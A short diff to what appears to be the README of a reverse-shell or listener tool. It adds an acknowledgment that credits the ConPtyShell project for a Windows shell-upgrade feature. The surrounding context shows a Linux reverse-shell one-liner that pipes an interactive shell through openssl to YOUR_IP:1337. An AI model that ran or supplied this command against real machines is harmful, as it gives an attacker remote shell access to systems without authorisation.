@@ -93,3 +93,7 @@ On a __linux__ target, you can use the following command to __connect to your li
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1| openssl s_client -connect YOUR_IP:1337 >/tmp/f
 ```
+
+## Acknowledgment
+
+The _shell upgrade_ feature for _windows_ is taken from the [ConPtyShell](https://github.com/antonioCoco/ConPtyShell/) project.
